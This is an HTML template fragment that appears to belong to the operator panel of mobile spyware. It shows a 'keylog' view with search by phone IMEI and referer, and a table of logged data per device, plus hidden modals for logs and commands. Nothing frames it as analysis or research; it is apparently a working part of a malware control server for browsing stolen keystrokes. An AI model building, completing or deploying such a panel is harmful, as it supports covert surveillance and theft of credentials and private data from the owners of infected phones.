
<div class="demo-charts mdl-shadow--2dp mdl-cell mdl-cell--12-col mdl-grid" style="background-color: #37474f;">	
            <h5 style="color: white;"><i class="material-icons" style="color: white; margin-right: 20px;">poll</i>Total items: %%PLACE_TOTAL_ITEMS_HERE%%</h5>
</div>
<div  class="demo-charts mdl-color--white mdl-shadow--2dp mdl-cell mdl-cell--12-col mdl-grid">
<div class="mdl-textfield mdl-js-textfield mdl-textfield--floating-label" style="margin-left: 20px;width: 180px;">
    <input class="mdl-textfield__input" type="text" id="IMEI_search">
    <label class="mdl-textfield__label" for="IMEI_search">IMEI search...</label>
</div>
<button style="margin-left: 10px;margin-top: 15px;" class="mdl-button" onclick="location.href='index.php?command=keylog&imei=' + $('#IMEI_search').val();"><i class="material-icons">search</i>
</button>

<div class="mdl-textfield mdl-js-textfield mdl-textfield--floating-label" style="margin-left: 20px;width: 180px;">
    <input class="mdl-textfield__input" type="text" id="referer_search">
    <label class="mdl-textfield__label" for="referer_search">Referer search...</label>
</div>
<button style="margin-left: 10px;margin-top: 15px;" class="mdl-button" onclick="location.href='index.php?command=keylog&referer=' + $('#referer_search').val();"><i class="material-icons">search</i>
</button>


<div style="width: 100%; margin-top: 10px;">
	<table class="mdl-shadow--2dp tmain" cellpadding="1" align="center" width=100%>      
	<thead>
		<th>id</th>
		<th>IMEI</th>
		<th>Data</th>
		<th>Date</th>
		<th>Referer</th>
	</thead>
	%%PLACE_TABLE_HERE%%
	</table>
	

</div>

<div id = "logs_modal" style="display:none;"></div>
<div id = "commands_modal" style="display:none;"></div>

<div style="width: 100%">
<center>
	%%PLACE_BOTTOM_LINKS_HERE%%
</center>
</div>